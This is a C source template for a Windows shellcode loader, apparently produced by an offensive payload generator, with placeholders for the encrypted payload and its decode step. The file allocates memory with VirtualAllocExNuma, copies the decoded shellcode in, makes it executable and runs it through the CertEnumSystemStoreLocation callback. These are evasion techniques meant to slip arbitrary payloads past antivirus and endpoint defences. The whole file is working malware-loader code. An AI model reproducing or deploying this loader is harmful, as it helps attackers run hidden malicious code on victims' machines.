#include <windows.h>
#include <stdio.h>
#include <wincrypt.h>
#include "base64.h"
#include "syscall.h"
#pragma comment(lib, "crypt32.lib")
// Requires Crypt32.lib

char Ciphertext[] = "<Ciphertext>";

int main() {

	LPVOID addr = VirtualAllocExNuma(GetCurrentProcess(), NULL, sizeof(Ciphertext), MEM_COMMIT, PAGE_READWRITE, 0);

	<decode>

	RtlMoveMemory(addr, shellcode, sizeof(Ciphertext));

	DWORD pflOldProtect;
	VirtualProtect(addr, sizeof(Ciphertext), PAGE_EXECUTE_READ, &pflOldProtect);

	CertEnumSystemStoreLocation(NULL, nullptr, (PFN_CERT_ENUM_SYSTEM_STORE_LOCATION)addr);


}